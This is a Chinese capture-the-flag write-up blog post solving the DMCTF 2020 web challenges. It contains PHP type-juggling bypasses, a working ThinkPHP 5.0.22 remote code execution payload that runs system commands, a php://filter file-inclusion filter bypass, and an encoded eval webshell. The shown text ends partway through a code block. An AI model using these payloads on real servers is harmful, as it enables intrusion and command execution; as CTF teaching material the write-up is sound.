<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title class=pjax-title>DMCTF之Web - Braindance</title><meta name=Description content="Braindance's blog"><meta property="og:title" content="DMCTF之Web"><meta property="og:description" content="前言比赛地址：http://dmctf.vaala.cloud:81 这次先写Web题目部分，我最后的排名： Web weak_type源码： 1 2 3 4"><meta property="og:type" content="article"><meta property="og:url" content="https://www.braindance.top/posts/dmctf%E4%B9%8Bweb/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-29T23:17:50+08:00"><meta property="article:modified_time" content="2020-11-29T23:17:50+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="DMCTF之Web"><meta name=twitter:description content="前言比赛地址：http://dmctf.vaala.cloud:81 这次先写Web题目部分，我最后的排名： Web weak_type源码： 1 2 3 4"><meta name=application-name content="Braindance"><meta name=apple-mobile-web-app-title content="Braindance"><meta name=theme-color content="#f8f8f8"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=canonical href=https://www.braindance.top/posts/dmctf%E4%B9%8Bweb/><link rel=prev href=https://www.braindance.top/posts/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/><link rel=next href=https://www.braindance.top/posts/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"DMCTF之Web","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.braindance.top\/posts\/dmctf%E4%B9%8Bweb\/"},"genre":"posts","keywords":"web, DMCTF2020, RCE","wordcount":4270,"url":"https:\/\/www.braindance.top\/posts\/dmctf%E4%B9%8Bweb\/","datePublished":"2020-11-29T23:17:50+08:00","dateModified":"2020-11-29T23:17:50+08:00","publisher":{"@type":"Organization","name":"Braindance"},"author":{"@type":"Person","name":"Braindance"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark")}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else""==="light"||""==="dark"||""==="black"?(setTheme(""),saveTheme("")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")]</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Braindance>Braindance</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜些什么 id=search-input-desktop>
<a href=# onclick=return!1 class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=# onclick=return!1 class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=# onclick=return!1 class="menu-item theme-select" title=切换主题><i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-desktop title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Braindance>Braindance</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜些什么 id=search-input-mobile>
<a href=# onclick=return!1 class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=# onclick=return!1 class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=# onclick=return!1 class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a href=# onclick=return!1 class="menu-item theme-select" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#weak_type>weak_type</a></li><li><a href=#thinkphp>thinkphp</a></li><li><a href=#fungame>fungame</a></li><li><a href=#bingxie>bingxie</a></li><li><a href=#filerce>filerce</a></li><li><a href=#do_you_have_a_right_token>do_you_have_a_right_token</a></li><li><a href=#pingpingping>pingpingping</a></li><li><a href=#p3webshell>p3’webshell</a></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle","normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DMCTF之Web</h1><div class=post-meta><div class=post-meta-line><span class=post-author><i class="author fas fa-user-circle fa-fw"></i><a href=/ title=Author rel=author class=author>Braindance</a>
</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2020-11-29>2020-11-29</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2020-11-29>2020-11-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 4270 字&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 9 分钟&nbsp;<span id=/posts/dmctf%E4%B9%8Bweb/ class=leancloud_visitors data-flag-title=DMCTF之Web>
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#weak_type>weak_type</a></li><li><a href=#thinkphp>thinkphp</a></li><li><a href=#fungame>fungame</a></li><li><a href=#bingxie>bingxie</a></li><li><a href=#filerce>filerce</a></li><li><a href=#do_you_have_a_right_token>do_you_have_a_right_token</a></li><li><a href=#pingpingping>pingpingping</a></li><li><a href=#p3webshell>p3’webshell</a></li></ul></nav></div></div><div class=content id=content><div class="details admonition warning open"><div class="details-summary admonition-title"><i class="icon fas fa-exclamation-triangle fa-fwwarning"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>本文最后更新于 <span class=timeago datetime=2020-11-29T23:17:50 title="November 29, 2020">2020-11-29</span>，文中内容可能已过时。</div></div></div><h1 id=前言 class=headerLink><a href=#%e5%89%8d%e8%a8%80 class=header-mark></a>前言</h1><p>比赛地址：<a href=http://dmctf.vaala.cloud:81/ target=_blank rel="noopener noreffer">http://dmctf.vaala.cloud:81</a></p><p>这次先写Web题目部分，我最后的排名：</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130085338.png title=img></p><h1 id=web class=headerLink><a href=#web class=header-mark></a>Web</h1><h2 id=weak_type class=headerLink><a href=#weak_type class=header-mark></a>weak_type</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PHP
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>show_source(__FILE__);
</span></span><span class=line><span class=cl>include(&#39;class.php&#39;);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//level1 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if(isset($_GET[&#39;num&#39;])){
</span></span><span class=line><span class=cl>    $num = $_GET[&#39;num&#39;];
</span></span><span class=line><span class=cl>    if($num===&#34;202020020&#34;){
</span></span><span class=line><span class=cl>        die(&#34;no no no!&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    if(intval($num,0)===202020020){
</span></span><span class=line><span class=cl>        echo &#34;&lt;br&gt; level 1 Ok &lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>    }else{
</span></span><span class=line><span class=cl>        die(&#39;what are you doing?&#39;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}else{
</span></span><span class=line><span class=cl>    die();
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//level 2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;])){
</span></span><span class=line><span class=cl>    $v1 = $_GET[&#39;v1&#39;];
</span></span><span class=line><span class=cl>    $v2 = $_GET[&#39;v2&#39;];
</span></span><span class=line><span class=cl>    if($v1 != $v2 &amp;&amp; md5($v1)==md5($v2)){
</span></span><span class=line><span class=cl>        echo &#34;&lt;br&gt; level 2 Ok &lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>    }else{
</span></span><span class=line><span class=cl>        die(&#39;Are you kidding me ?&#39;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}else{
</span></span><span class=line><span class=cl>    die();
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//level 3 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if (isset($_POST[&#39;message&#39;])) {
</span></span><span class=line><span class=cl>    $message = json_decode($_POST[&#39;message&#39;]);
</span></span><span class=line><span class=cl>    if ($message-&gt;key == $key) {
</span></span><span class=line><span class=cl>        echo &#34;&lt;br&gt; Wow you got it !!! &lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>        echo file_get_contents(&#39;/flag&#39;);
</span></span><span class=line><span class=cl>    } 
</span></span><span class=line><span class=cl>    else {
</span></span><span class=line><span class=cl>        die(&#34;fail&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl> }
</span></span><span class=line><span class=cl>else{
</span></span><span class=line><span class=cl>     echo &#34;~~~~&#34;;
</span></span><span class=line><span class=cl> }
</span></span></code></pre></td></tr></table></div></div><p><strong>第一关</strong>利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造<code>num=202020020a</code>，即可。</p><blockquote><p>intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞</p></blockquote><p><strong>第二关</strong>利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：<code>v1=QNKCDZO&v2=240610708</code>，这篇博客中还进一步的讲解了一些<a href=https://blog.csdn.net/qq_19980431/article/details/83018232 target=_blank rel="noopener noreffer">md5函数的漏洞</a>。</p><p><strong>第三关</strong>进行<code>$message->key</code>和<code>$key</code>进行判断，<code>$key</code>之前没有声明过故值为空，所以传入的<code>message</code>也为空即可。post中传入<code>message=</code> 即可。</p><p><strong>完整payload</strong>：</p><p>url: <code>http://dmctf.vaala.cloud:28113/?num=202020020a&v1=QNKCDZO&v2=240610708</code></p><p>post: <code>message=</code></p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129202453.png title=img></p><h2 id=thinkphp class=headerLink><a href=#thinkphp class=header-mark></a>thinkphp</h2><p>看到框架首先去搜索框架的漏洞，参考了[<a href=https://blog.csdn.net/qq_37865996/article/details/107468816 target=_blank rel="noopener noreffer">框架漏洞]Thinkphp系列漏洞【截至2020-07-20】</a></p><p>这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对<code>$_POST[‘_method’]</code>属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。</p><p>测试payload：</p><p><strong>url</strong>： <code>?s=captcha</code></p><p><strong>post</strong>： <code>_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=whoami</code></p><p>虽然报错但是最上方输出了<code>www-data</code></p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203051.png title=img></p><p>根据题目中的提示<strong>flag在环境变量中</strong>，所以在网上查询linux系统输出环境变量的语句：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SHELL
</span></span><span class=line><span class=cl>env
</span></span></code></pre></td></tr></table></div></div><p>最终获取到flag的payload：</p><p>url： <code>?s=captcha</code></p><p>post： <code>_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=env</code></p><p>在输出末尾即是flag。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129203818.png title=img></p><h2 id=fungame class=headerLink><a href=#fungame class=header-mark></a>fungame</h2><p>打开是个游戏当然要玩一玩了在线地址：https://justdui.github.io/。</p><p>我先下了源码到本地康一康，查看源码在<code>game.js</code>中第122行中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>JAVASCRIPT
</span></span><span class=line><span class=cl>nextLevel = (nextLevel+1)%11;
</span></span></code></pre></td></tr></table></div></div><p><code>nextlevel</code>根据变量名猜想是下一关的值，直接一个一个试，发现第10关入场动画不同，而且又一个大波斯，感觉就是最后一关，再将代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>JAVASCRIPT
</span></span><span class=line><span class=cl>class PlayerData
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    // track player data between levels (when player is destroyed)
</span></span><span class=line><span class=cl>    constructor()
</span></span><span class=line><span class=cl>    {
</span></span><span class=line><span class=cl>        this.health = 3;
</span></span><span class=line><span class=cl>        this.healthMax = 3;
</span></span><span class=line><span class=cl>        this.boomerangs = 1;
</span></span><span class=line><span class=cl>        this.bigBoomerangs = 0;
</span></span><span class=line><span class=cl>        this.coins = 0;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>人物属性值中的<code>health</code>、<code>healthMax</code>、<code>bigBoomerangs</code>数量修改为9999，三个对应的属性值分别为：生命值、生命上限、大型飞镖。当然修改以后代码不会直接生效，需要随便进一关自杀游戏reload一下。</p><p>击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg title=img></p><h2 id=bingxie class=headerLink><a href=#bingxie class=header-mark></a>bingxie</h2><p>首先根据提示：<strong>你需要一些特殊软件</strong>，再看题目联想到<a href=https://github.com/rebeyond/Behinder/releases target=_blank rel="noopener noreffer">Behinder</a>，首先下载工具。</p><p>分析题目：</p><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PHP
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>error_reporting(0);
</span></span><span class=line><span class=cl>highlight_file(__FILE__);
</span></span><span class=line><span class=cl>function filter($file) //hint in bingxie.php
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    $file = strtolower($file);
</span></span><span class=line><span class=cl>    $file = str_replace(&#39;php&#39;, &#34;&#34;, $file);
</span></span><span class=line><span class=cl>    $file = str_replace(&#39;data&#39;, &#34;???&#34;, $file);
</span></span><span class=line><span class=cl>    $file = str_replace(&#39;http&#39;, &#34;???&#34;, $file);
</span></span><span class=line><span class=cl>    $file = str_replace(&#39;file&#39;, &#34;???&#34;, $file);
</span></span><span class=line><span class=cl>    $file = str_replace(&#39;input&#39;, &#34;???&#34;, $file);
</span></span><span class=line><span class=cl>    $file = str_replace(&#39;filter&#39;, &#34;&#34;, $file);
</span></span><span class=line><span class=cl>    $file = str_replace(&#39;log&#39;,&#34;???&#34;,$file);
</span></span><span class=line><span class=cl>    return $file;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>$file = $_GET[&#39;file&#39;];
</span></span><span class=line><span class=cl>$md5 =substr(md5($_GET[&#39;md5&#39;]),0,6);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$file = filter($file);
</span></span><span class=line><span class=cl>if ($md5==&#39;e95100&#39;)
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>  include $file;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>代码16、17行使用GET方法获得<code>file</code>和<code>md5</code>参数，<code>file</code>经过filter函数过滤一些PHP协议，<code>md5</code>参数进行md5加密并截取前6位，判断是否为<code>e95100</code>，如果判定成功include包含<code>file</code>变量指定的文件。</p><p>首先计算什么数进行md5加密后前六位是<code>e95100</code>。参考了<a href=https://stackoverflow.com/questions/21636042/getting-md5-with-certain-character-pattern target=_blank rel="noopener noreffer">Getting MD5 with certain character pattern</a>中的回答，使用脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PYTHON
</span></span><span class=line><span class=cl>import hashlib
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>target = &#39;e95100&#39;
</span></span><span class=line><span class=cl>candidate = 0
</span></span><span class=line><span class=cl>while True:
</span></span><span class=line><span class=cl>    plaintext = str(candidate)
</span></span><span class=line><span class=cl>    hash = hashlib.md5(plaintext.encode(&#39;ascii&#39;)).hexdigest()
</span></span><span class=line><span class=cl>    if hash[:6] == target:
</span></span><span class=line><span class=cl>        print(&#39;plaintext:&#34;&#39; + plaintext + &#39;&#34;, md5:&#39; + hash)
</span></span><span class=line><span class=cl>        break
</span></span><span class=line><span class=cl>    candidate = candidate + 1
</span></span></code></pre></td></tr></table></div></div><p>运行之后很快得出md5加密后前六位是<code>e95100</code>的数字是<code>6666</code>。</p><p>再根据提示<code>hint in bingxie.php</code>，直接访问<code>/bingxie.php</code>只得到一句输出：**no ,you are not a real hacker !!!**说的确实没错，想到使用php协议读取文件内容，因为<code>str_replace</code>函数只进行一次替换，所以在合适的位置进行双写即可绕过。构造payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CODE
</span></span><span class=line><span class=cl>http://网址?md5=6666&amp;file=pphphp://fifilterlter/convert.base64-encode/resource=bingxie.pphphp
</span></span></code></pre></td></tr></table></div></div><p>得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的<a href=https://github.com/gchq/CyberChef target=_blank rel="noopener noreffer">github项目地址</a>）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CODE
</span></span><span class=line><span class=cl>PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQovL+WmguaenOaOpeaUtuWIsHBhc3Plj4LmlbDvvIzliJnkvJrnlJ/miJAxNuS9jeeahOmaj+acuuenmOmSpe+8jOWtmOWCqOWIsHNlc3Npb27kuK0NCiRhID0gJF9HRVRbJ2EnXTsNCiRiID0gJF9HRVRbJ2InXTsNCmlmKCRhIT0kYiYmbWQ1KCRhKT09bWQ1KCRiKSkNCnsNCiAgICBlY2hvICJ5b3UgYXJlIHJpZ2h0IjsNCn0NCmVsc2V7DQogICAgZGllKCJubyAseW91IGFyZSBub3QgYSByZWFsIGhhY2tlciAhISEiKTsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZWNyZXQnXSkpDQp7DQogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7DQogICAgJF9TRVNTSU9OWydrJ109JGtleTsNCiAgICBwcmludCAka2V5Ow0KfQ0KDQplbHNlDQp7DQogICAgJGtleT0kX1NFU1NJT05bJ2snXTsNCg0KICAgICRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KDQogICAgaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICB7DQogICAgICAgICR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCiAgICAgICAgJHBvc3Q9JHQoJHBvc3QuIiIpOw0KICAgICAgICANCiAgICAgICAgZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgICAgICAgICAgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOw0KICAgICAgICAgICAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlDQogICAgew0KICAgICAgICAkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCiAgICB9DQoNCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCiAgICBjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319DQoNCiAgICBAbmV3IEMoJHBhcmFtcyk7DQp9DQo/Pg==
</span></span></code></pre></td></tr></table></div></div><p>解码后得到一个php文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
